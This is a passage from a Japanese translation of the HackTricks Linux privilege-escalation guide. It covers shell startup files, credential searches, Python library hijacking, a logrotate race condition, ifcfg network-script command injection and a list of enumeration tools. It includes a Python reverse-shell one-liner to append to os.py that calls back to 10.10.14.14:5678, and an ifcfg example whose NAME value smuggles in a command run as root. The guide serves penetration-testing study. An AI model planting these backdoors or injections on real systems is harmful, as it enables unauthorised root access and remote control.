grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
シェルファイル

### SUID files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 一般的なクレデンシャルの検索/正規表現

また、**名前**または**内容**に単語「**password**」を含むファイルをチェックし、ログ内のIPやメールアドレス、ハッシュの正規表現もチェックする必要があります。
これらの方法をすべてここで説明するつもりはありませんが、興味がある場合は、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Pythonライブラリのハイジャック

Pythonスクリプトが実行される**場所**がわかり、そのフォルダに**書き込み**することができるか、Pythonライブラリを**変更**することができる場合、OSライブラリを変更してバックドアを設置することができます（Pythonスクリプトが実行される場所に書き込みできる場合は、os.pyライブラリをコピーして貼り付けてください）。

ライブラリにバックドアを設置するには、os.pyライブラリの最後に次の行を追加します（IPとPORTを変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotateの脆弱性

`logrotate`には、**ログファイルまたはその親ディレクトリのいずれかに書き込み権限**を持つユーザーが、`logrotate`によって**任意の場所にファイルを書き込む**ことができる脆弱性が存在します。もし**logrotate**が**root**によって実行されている場合、ユーザーはログインするすべてのユーザーによって実行される_**/etc/bash\_completion.d/**_に任意のファイルを書き込むことができます。

したがって、**ログファイル**またはその**親フォルダ**のいずれかに**書き込み権限**がある場合、ほとんどのLinuxディストリビューションでは（logrotateは自動的に1日に1回**rootユーザー**として実行されます）、**特権昇格**が可能です。また、_**/var/log**_以外にも**ローテーション**されているファイルがあるかどうかも確認してください。

{% hint style="info" %}
この脆弱性は、`logrotate`バージョン`3.18.0`およびそれ以前に影響します。
{% endhint %}

この脆弱性の詳細情報は、次のページで確認できます：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

[**logrotten**](https://github.com/whotwagner/logrotten)を使用してこの脆弱性を悪用することができます。

この脆弱性は、[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginxログ）**と非常に類似していますので、ログを変更できることがわかった場合は、ログをシンボリックリンクで置き換えて特権を昇格できるかどうかを確認してください。

### /etc/sysconfig/network-scripts/（Centos/Redhat）

何らかの理由で、ユーザーが_**/etc/sysconfig/network-scripts**_に`ifcf-<whatever>`スクリプトを**書き込む**ことができるか、既存のスクリプトを**調整**できる場合、あなたの**システムは乗っ取られています**。

ネットワークスクリプト（例：_ifcg-eth0_）は、ネットワーク接続に使用されます。これらは.INIファイルとまったく同じように見えますが、LinuxではNetwork Manager（dispatcher.d）によって\~ソース化\~されます。

私の場合、これらのネットワークスクリプトの`NAME=`属性が正しく処理されていません。もし名前に**空白が含まれている場合、空白の後の部分が実行されようとします**。つまり、**最初の空白の後にあるすべての部分がrootとして実行されます**。

例：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**脆弱性参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init、init.d、systemd、およびrc.d**

`/etc/init.d`には、System V initツール（SysVinit）で使用される**スクリプト**が含まれています。これは、Linuxの**伝統的なサービス管理パッケージ**であり、`init`プログラム（カーネルの初期化が完了したときに実行される最初のプロセス¹）およびサービスの開始、停止、および設定を行うためのインフラストラクチャを含んでいます。具体的には、`/etc/init.d`のファイルは、特定のサービスを管理するために`start`、`stop`、`restart`、および（サポートされている場合）`reload`コマンドに応答するシェルスクリプトです。これらのスクリプトは直接呼び出すこともできますが（最も一般的には）、他のトリガー（通常は`/etc/rc?.d/`にシンボリックリンクが存在すること）を介して呼び出されます。 （[ここから](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。Redhatでは、このフォルダの代替として`/etc/rc.d/init.d`があります。

`/etc/init`には、**Upstart**で使用される**設定ファイル**が含まれています。Upstartは、Ubuntuで推奨される若い**サービス管理パッケージ**です。`/etc/init`のファイルは、Upstartに対してサービスの`start`、`stop`、`reload`、または`status`のクエリをどのように行うか、およびいつ行うかを指示する設定ファイルです。Lucid以降、UbuntuはSysVinitからUpstartに移行しており、そのためにUpstartの設定ファイルが好まれるにもかかわらず、多くのサービスにはSysVinitスクリプトが付属しています。SysVinitスクリプトはUpstartの互換性レイヤーで処理されます。 （[ここから](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。

**systemd**は、Linuxの初期化システムおよびサービスマネージャであり、オンデマンドでデーモンを起動する機能、マウントおよび自動マウントポイントのメンテナンス、スナップショットサポート、およびLinuxコントロールグループを使用したプロセスのトラッキングなどの機能を備えています。systemdは、ログデーモンや他のツール、一般的なシステム管理タスクをサポートするためのユーティリティを提供します。 （[ここから](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)）。

ディストリビューションリポジトリからダウンロードされたパッケージに含まれるファイルは`/usr/lib/systemd/`に配置されます。システム管理者（ユーザー）によって行われる変更は`/etc/systemd/system/`に配置されます。

## その他のトリック

### NFS特権昇格

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 制限されたシェルからの脱出

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## カーネルセキュリティ保護

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## その他のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privescツール

### **Linuxローカル特権昇格ベクタを探すための最適なツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-tオプション)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** LinuxおよびMACでカーネルの脆弱性を列挙する[https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail（物理アクセス）:** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプトのまとめ**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考文献

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ Hack
* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社を宣伝**したいですか？または、**最新版のPEASSを入手したい**ですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのテクニックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出**してください。

</details>
